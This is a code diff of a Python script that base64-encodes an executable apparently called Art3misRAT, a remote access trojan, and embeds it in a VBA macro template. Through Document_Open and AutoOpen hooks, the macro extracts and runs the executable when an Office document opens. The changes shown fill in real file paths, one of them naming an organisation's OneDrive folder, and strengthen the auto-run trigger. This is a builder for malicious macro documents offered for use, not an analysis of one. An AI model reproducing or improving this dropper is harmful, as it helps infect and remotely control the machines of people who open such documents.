@@ -1,8 +1,8 @@
 import base64
 
 # Specify the file paths
-exe_path = r"C:\Users\path_to_file.exe" 
-output_path = r"C:\Users\path_to_file.txt"
+exe_path = r"C:\Users\Admin\Downloads\Art3misRAT.exe"
+output_path = r"C:\Users\Admin\OneDrive - UT Health San Antonio\Desktop\rat_encoded.txt"
 
 # Read the executable and encode it in base64
 with open(exe_path, "rb") as exe_file:
@@ -15,10 +15,10 @@ chunks = [encoded_string[i:i + chunk_size] for i in range(0, len(encoded_string)
 # VBA code template with placeholder for the base64 string chunks
 vba_template = """
 Private Sub Document_Open()
-    Call ExtractAndRun
+    Call AutoOpen
 End Sub
 
-Private Sub Document_New()
+Sub AutoOpen()
     Call ExtractAndRun
 End Sub
 
